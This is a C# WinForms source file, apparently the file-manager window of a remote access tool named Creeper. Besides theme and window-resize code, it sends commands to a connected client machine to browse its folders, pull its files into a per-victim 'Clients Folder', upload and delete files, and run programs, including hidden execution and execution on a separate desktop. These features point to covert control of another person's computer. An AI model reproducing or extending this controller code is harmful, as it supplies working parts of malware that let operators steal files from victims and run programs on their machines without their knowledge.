using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Creeper.Connection;
using Creeper.Controls;
using Creeper.Properties;
using MessagePack;
using Microsoft.VisualBasic;
using static Creeper.Helper.Helper;

namespace Creeper.singleForms
{
    public partial class singleFormFile : Form
    {
        public Clients Client { get; set; }
        private ListViewColumnSorter lvwColumnSorter;
        private string IO { get; set; }

        public singleFormFile()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            InitBorder();
            SetTheme();
            IO = "copy";
        }
        #region Theme
        private void SetTheme()
        {
            bool darkTheme = Settings.Default.darkTheme;

            Color colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            Color colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            paneltop.BackColor = colorSide;
            buttonmax.BackColor = colorSide;
            buttonmin.BackColor = colorSide;
            labelCreeper.BackColor = colorSide;
            labelCreeper.ForeColor = colorText;
            buttonclose.BackColor = colorSide;

            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;
            buttonmax.Image = darkTheme ? Resources.max : Resources.max_dark;
            buttonmin.Image = darkTheme ? Resources.min : Resources.min_dark;

            toolStripfile.BackColor = colorSide;
            toolStripTextBoxaddress.ForeColor = colorText;
            toolStripTextBoxaddress.BackColor = colorSide;

            toolStripButtonback.Image = darkTheme ? Resources.back : Resources.back_dark;
            toolStripButtondownload.Image = darkTheme ? Resources.download : Resources.download_dark;
            toolStripButtongoto.Image = darkTheme ? Resources._goto : Resources.goto_dark;
            toolStripButtonnew.Image = darkTheme ? Resources.newfolder : Resources.newfolder_dark;
            toolStripButtonrefresh.Image = darkTheme ? Resources.refresh : Resources.refresh_dark;
            toolStripButtonupload.Image = darkTheme ? Resources.upload : Resources.upload_dark;
            toolStripDropDownButtonjump.Image = darkTheme ? Resources.jump : Resources.jump_dark;

            //listViewfile
            listViewfile.BackColor = darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
            listViewfile.ForeColor = darkTheme ? Settings.Default.colorlistviewtextdark : Settings.Default.colorlistviewtext;
            foreach (ListViewItem item in listViewfile.Items)
            {
                item.ForeColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewtextdark : Settings.Default.colorlistviewtext;
                item.BackColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
            }

            toolStrip.ForeColor = colorText;
            toolStrip.BackColor = colorSide;

        }
        #endregion

        #region Border
        public enum MouseDirection
        {
            East,
            West,
            South,
            North,
            Southeast,
            Southwest,
            Northeast,
            Northwest,
            None
        }
        MouseDirection direction;
        Point rectangle;
        void InitBorder()
        {

            MouseDown += BorderMouseDown;

            MouseMove += BorderMouseMove;

            MouseLeave += BorderMouseLeave;
        }

        private void BorderMouseMove(object sender, MouseEventArgs e)
        {
            Point tempEndPoint = e.Location;
            int maxwidth = 1000;
            int maxheight = 500;

            if (e.Button == MouseButtons.Left)
            {
                if (direction == MouseDirection.None)
                {
                }
                else if (direction == MouseDirection.East)
                {
                    if (tempEndPoint.X <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = tempEndPoint.X;
                    }

                }
                else if (direction == MouseDirection.South)
                {
                    if (tempEndPoint.Y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = tempEndPoint.Y;
                    }
                }
                else if (direction == MouseDirection.West)
                {
                    int x = tempEndPoint.X - rectangle.X;
                    if (Width - x <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = Width - x;
                        Location = new Point(Location.X + x, Location.Y);
                    }


                }
                else if (direction == MouseDirection.North)
                {
                    int y = tempEndPoint.Y - rectangle.Y;
                    if (Height - y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = Height - y;
                        Location = new Point(Location.X, Location.Y + y);
                    }

                }
                else if (direction == MouseDirection.Southeast)
                {
                    if (tempEndPoint.X <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = tempEndPoint.X;
                    }
                    if (tempEndPoint.Y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = tempEndPoint.Y;
                    }

                }
                else if (direction == MouseDirection.Northeast)
                {
                    int y = tempEndPoint.Y - rectangle.Y;
                    if (Height - y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = Height - y;
                        Location = new Point(Location.X, Location.Y + y);
                    }
                    if (tempEndPoint.X <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = tempEndPoint.X;
                    }
                }
                else if (direction == MouseDirection.Southwest)
                {
                    int x = tempEndPoint.X - rectangle.X;
                    if (Width - x <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = Width - x;
                        Location = new Point(Location.X + x, Location.Y);
                    }
                    if (tempEndPoint.Y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = tempEndPoint.Y;
                    }

                }
                else if (direction == MouseDirection.Northwest)
                {
                    int x = tempEndPoint.X - rectangle.X;
                    if (Width - x <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = Width - x;
                        Location = new Point(Location.X + x, Location.Y);
                    }
                    int y = tempEndPoint.Y - rectangle.Y;
                    if (Height - y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = Height - y;
                        Location = new Point(Location.X, Location.Y + y);
                    }
                }
            }
            else
            {
                if (e.Location.X < 3 && e.Location.Y < 3)
                {
                    Cursor = Cursors.SizeNWSE;
                    direction = MouseDirection.Northwest;
                }
                else if (e.Location.X > Width - 3 && e.Location.Y < 3)
                {
                    Cursor = Cursors.SizeNESW;
                    direction = MouseDirection.Northeast;
                }
                else if (e.Location.X > Width - 3 && e.Location.Y > Height - 3)
                {
                    Cursor = Cursors.SizeNWSE;
                    direction = MouseDirection.Southeast;
                }
                else if (e.Location.X < 3 && e.Location.Y > Height - 3)
                {
                    Cursor = Cursors.SizeNESW;
                    direction = MouseDirection.Southwest;
                }
                else if (e.Location.X < 3 && e.Location.Y < Height - 3 && e.Location.Y > 3)
                {
                    Cursor = Cursors.SizeWE;
                    direction = MouseDirection.West;
                }
                else if (e.Location.X > 3 && e.Location.X < Width - 3 && e.Location.Y < 3)
                {
                    Cursor = Cursors.SizeNS;
                    direction = MouseDirection.North;
                }
                else if (e.Location.X > Width - 3 && e.Location.Y < Height - 3 && e.Location.Y > 3)
                {
                    Cursor = Cursors.SizeWE;
                    direction = MouseDirection.East;
                }
                else if (e.Location.X > 3 && e.Location.X < Width - 3 && e.Location.Y > Height - 3)
                {
                    Cursor = Cursors.SizeNS;
                    direction = MouseDirection.South;
                }
                else
                {
                    Cursor = Cursors.Default;
                    direction = MouseDirection.None;
                }
            }
        }

        private void BorderMouseDown(object sender, MouseEventArgs e)
        {
            rectangle = e.Location;
        }

        private void BorderMouseLeave(object sender, EventArgs e)
        {
            Cursor = Cursors.Default;
            direction = MouseDirection.None;
        }

        #endregion

        #region Move
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;
        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        private void labelCreeper_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        #endregion
        private void buttonmin_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void buttonmax_Click(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Maximized)
            {
                WindowState = FormWindowState.Normal;
            }
            else
            {
                MaximumSize = new Size(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height);
                WindowState = FormWindowState.Maximized;
            }
        }

        private void buttonclose_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void listViewfile_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            int tColumnCount;
            Rectangle tRect = new Rectangle();
            Point tPoint = new Point();
            Font tFont = new Font("Segoe UI", 9, FontStyle.Regular);
            SolidBrush tBackBrush = new SolidBrush(Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview);
            SolidBrush tFtontBrush;
            tFtontBrush = new SolidBrush(Settings.Default.darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext);
            if (listViewfile.Columns.Count == 0)
            {
                return;
            }

            tColumnCount = listViewfile.Columns.Count;
            tRect.Y = 0;
            tRect.Height = e.Bounds.Height - 1;
            tPoint.Y = 3;
            for (int i = 0; i < tColumnCount; i++)
            {
                if (i == 0)
                {
                    tRect.X = 0;
                    tRect.Width = listViewfile.Columns[i].Width;
                }
                else
                {
                    tRect.X += tRect.Width;
                    tRect.X += 1;
                    tRect.Width = listViewfile.Columns[i].Width - 1;
                }
                e.Graphics.FillRectangle(tBackBrush, tRect);
                tPoint.X = tRect.X + 3;
                e.Graphics.DrawString(listViewfile.Columns[i].Text, tFont, tFtontBrush, tPoint);
            }
        }

        private void listViewfile_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void listViewfile_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count == 1)
                {
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "getPath";
                    pack.ForcePathObject("Path").AsString = listViewfile.SelectedItems[0].ToolTipText;
                    ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());

                    listViewfile.Enabled = false;
                    toolStripLabelalert.ForeColor = Color.Green;
                    toolStripLabelalert.Text = "Please Wait";
                }
            }
            catch { }
        }

        private void toolStripButtonback_Click(object sender, EventArgs e)
        {
            try
            {
                string path = toolStripTextBoxaddress.Text;
                if (path.Length <= 3)
                {
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "getDrivers";
                    ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());

                    toolStripTextBoxaddress.Text = "";
                }
                else
                {
                    path = path.Remove(path.LastIndexOfAny(new[] { '\\' }, path.LastIndexOf('\\')));
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "getPath";
                    pack.ForcePathObject("Path").AsString = path + "\\";
                    ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "getDrivers";
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                toolStripTextBoxaddress.Text = "";
            }
        }

        private void toolStripButtondownload_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count > 0)
                {
                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "Clients Folder\\" + Client.Info.HWID)))
                    {
                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Clients Folder\\" + Client.Info.HWID));
                    }

                    foreach (ListViewItem itm in listViewfile.SelectedItems)
                    {
                        if (itm.ImageIndex == 0 && itm.ImageIndex == 1 && itm.ImageIndex == 2)
                        {
                            return;
                        }

                        string dwid = Guid.NewGuid().ToString();
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "downloadFile";
                        pack.ForcePathObject("File").AsString = itm.ToolTipText;
                        pack.ForcePathObject("DWID").AsString = dwid;
                        ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch { }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listViewfile.SelectedItems)
                    {
                        if (itm.ImageIndex != 0 && itm.ImageIndex != 1 && itm.ImageIndex != 2)
                        {
                            MsgPack pack = new MsgPack();
                            pack.ForcePathObject("Packet").AsString = "deleteFile";
                            pack.ForcePathObject("File").AsString = itm.ToolTipText;
                            ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                        }
                        else if (itm.ImageIndex == 0)
                        {
                            MsgPack pack = new MsgPack();
                            pack.ForcePathObject("Packet").AsString = "deleteFolder";
                            pack.ForcePathObject("Folder").AsString = itm.ToolTipText;
                            ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                        }
                    }
                }
            }
            catch { }
        }

        private void toolStripButtonrefresh_Click(object sender, EventArgs e)
        {
            try
            {
                if (toolStripTextBoxaddress.Text != "")
                {
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "getPath";
                    pack.ForcePathObject("Path").AsString = toolStripTextBoxaddress.Text;
                    ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                }
                else
                {
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "getDrivers";
                    ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                    return;
                }
                listViewfile.Enabled = true;
            }
            catch { }
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listViewfile.SelectedItems)
                    {
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "execute";
                        pack.ForcePathObject("File").AsString = itm.ToolTipText;
                        ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch
            {

            }
        }

        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "getPath";
                pack.ForcePathObject("Path").AsString = "DESKTOP";
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
            }
            catch
            {

            }
        }

        private void folderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string foldername = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""));
                if (string.IsNullOrEmpty(foldername))
                {
                    return;
                }

                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "createFolder";
                pack.ForcePathObject("Folder").AsString = Path.Combine(toolStripTextBoxaddress.Text, foldername);
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
            }
            catch { }
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count > 0)
                {
                    StringBuilder files = new StringBuilder();
                    StringBuilder paths = new StringBuilder();
                    foreach (ListViewItem itm in listViewfile.SelectedItems)
                    {
                        if (itm.Group.Header== "Files")
                        {
                            files.Append(itm.ToolTipText + "-=>");
                        }
                        else if (itm.Group.Header == "Folders")
                        {
                            paths.Append(itm.ToolTipText + "-=>");
                        }
                    }
                    IO = "copy";
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "copyFile";
                    pack.ForcePathObject("File").AsString = files.ToString();
                    pack.ForcePathObject("Path").AsString = paths.ToString();
                    ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "pasteFile";
                pack.ForcePathObject("File").AsString = toolStripTextBoxaddress.Text;
                pack.ForcePathObject("IO").AsString = IO;
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
            }
            catch { }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listViewfile.SelectedItems.Count == 1)
            {
                try
                {
                    string filename = Interaction.InputBox("Rename File or Folder", "Name", listViewfile.SelectedItems[0].Text);
                    if (string.IsNullOrEmpty(filename))
                    {
                        return;
                    }

                    if (listViewfile.SelectedItems[0].ImageIndex != 0 && listViewfile.SelectedItems[0].ImageIndex != 1 && listViewfile.SelectedItems[0].ImageIndex != 2)
                    {
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "renameFile";
                        pack.ForcePathObject("File").AsString = listViewfile.SelectedItems[0].ToolTipText;
                        pack.ForcePathObject("NewName").AsString = Path.Combine(toolStripTextBoxaddress.Text, filename);
                        ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                        return;
                    }

                    if (listViewfile.SelectedItems[0].ImageIndex == 0)
                    {
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "renameFolder";
                        pack.ForcePathObject("Folder").AsString = listViewfile.SelectedItems[0].ToolTipText + "\\";
                        pack.ForcePathObject("NewName").AsString = Path.Combine(toolStripTextBoxaddress.Text, filename);
                        ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                    }
                }
                catch { }
            }
        }

        private void cutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count > 0)
                {
                    StringBuilder files = new StringBuilder();
                    foreach (ListViewItem itm in listViewfile.SelectedItems)
                    {
                        files.Append(itm.ToolTipText + "-=>");
                    }
                    IO = "cut";
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "copyFile";
                    pack.ForcePathObject("File").AsString = files.ToString();
                    ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void zipToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count > 0)
                {
                    StringBuilder files = new StringBuilder();
                    foreach (ListViewItem itm in listViewfile.SelectedItems)
                    {
                        files.Append(itm.ToolTipText + "-=>");

                    }
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "zip";
                    pack.ForcePathObject("Path").AsString = files.ToString();
                    pack.ForcePathObject("Zip").AsString = "true";
                    ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void unzipToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listViewfile.SelectedItems)
                    {
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "zip";
                        pack.ForcePathObject("Path").AsString = itm.ToolTipText;
                        pack.ForcePathObject("Zip").AsString = "false";
                        ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch { }
        }

        private void hiddenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listViewfile.SelectedItems)
                    {
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "executeHidden";
                        pack.ForcePathObject("File").AsString = itm.ToolTipText;
                        ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch
            {

            }
        }

        private void createNewDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listViewfile.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listViewfile.SelectedItems)
                    {
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "executeNewDesktop";
                        pack.ForcePathObject("File").AsString = itm.ToolTipText;
                        ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                    }
                }
            }
            catch
            {

            }
        }

        private void propertyToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButtongoto_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "getPath";
                pack.ForcePathObject("Path").AsString = toolStripTextBoxaddress.Text;
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
            }
            catch
            {

            }
        }

        private void appdataToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "getPath";
                pack.ForcePathObject("Path").AsString = "APPDATA";
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
            }
            catch
            {

            }
        }

        private void system32ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "getPath";
                pack.ForcePathObject("Path").AsString = "SYSTEM32";
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
            }
            catch
            {

            }
        }

        private void tempToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "getPath";
                pack.ForcePathObject("Path").AsString = "TEMP";
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
            }
            catch
            {

            }
        }

        private void textToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButtonupload_Click(object sender, EventArgs e)
        {
            if (toolStripTextBoxaddress.Text.Length >= 3)
            {
                try
                {
                    OpenFileDialog O = new OpenFileDialog();
                    O.Multiselect = true;
                    if (O.ShowDialog() == DialogResult.OK)
                    {
                        foreach (string ofile in O.FileNames)
                        {
                            MsgPack pack = new MsgPack();
                            pack.ForcePathObject("Packet").AsString = "uploadFile";
                            pack.ForcePathObject("Name").AsString = toolStripTextBoxaddress.Text + "\\" + Path.GetFileName(ofile);
                            pack.ForcePathObject("File").LoadFileAsBytes(ofile);
                            ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
                        }
                    }
                }
                catch { }
            }
        }

        private void userToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "getPath";
                pack.ForcePathObject("Path").AsString = "USER";
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
            }
            catch
            {

            }
        }

        private void installToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "install7Zip";
            pack.ForcePathObject("File").SetAsBytes(Resources._7za);
            pack.ForcePathObject("Dll").SetAsBytes(Resources._7z);
            ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
        }

        private void toolStripSplitButton1_Click(object sender, EventArgs e)
        {
            if (listViewfile.View == View.Details)
            {
                listViewfile.View = View.LargeIcon;
            }
            else
            {
                listViewfile.View = View.Details;
            }
        }

        private void listViewfile_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            try
            {
                listViewfile.Sort();
            }
            catch
            {
            }
        }

        private void singleFormFile_Load(object sender, EventArgs e)
        {
            Optimization.EnableListviewDoubleBuffer(listViewfile);
            lvwColumnSorter = new ListViewColumnSorter();
            listViewfile.ListViewItemSorter = lvwColumnSorter;
        }



        public static List<ListViewItem> GetFolders(MsgPack unpack_msgpack, ListViewGroup listViewGroup)
        {
            string[] _folder = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> lists = new List<ListViewItem>();
            int numFolders = 0;
            for (int i = 0; i < _folder.Length; i++)
            {
                if (_folder[i].Length > 0)
                {
                    ListViewItem lv = new ListViewItem
                    {
                        Text = _folder[i]
                    };
                    lv.SubItems.Add(_folder[i + 2]);
                    lv.ToolTipText = _folder[i + 1];
                    lv.Group = listViewGroup;
                    lv.ImageIndex = 0;
                    lists.Add(lv);
                    numFolders += 1;
                }
                i += 2;
            }
            return lists;
        }

        public static List<ListViewItem> GetFiles(MsgPack unpack_msgpack, ListViewGroup listViewGroup, ImageList imageList1, ImageList imageList2)
        {
            string[] _files = unpack_msgpack.ForcePathObject("File").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> lists = new List<ListViewItem>();
            for (int i = 0; i < _files.Length; i++)
            {
                if (_files[i].Length > 0)
                {
                    ListViewItem lv = new ListViewItem
                    {
                        Text = Path.GetFileName(_files[i]),
                        ToolTipText = _files[i + 1]
                    };
                    Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_files[i + 2])));

                    FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                    {
                        imageList1.Images.Add(_files[i + 1], im);
                        imageList2.Images.Add(_files[i + 1], im);
                    }));
                    lv.ImageKey = _files[i + 1];
                    lv.Group = listViewGroup;
                    lv.SubItems.Add(_files[i + 4]);
                    lv.SubItems.Add(_files[i + 5]);
                    lv.SubItems.Add(BytesToString(Convert.ToInt64(_files[i + 3])));
                    lists.Add(lv);
                }
                i += 5;
            }
            return lists;
        }
    }
}
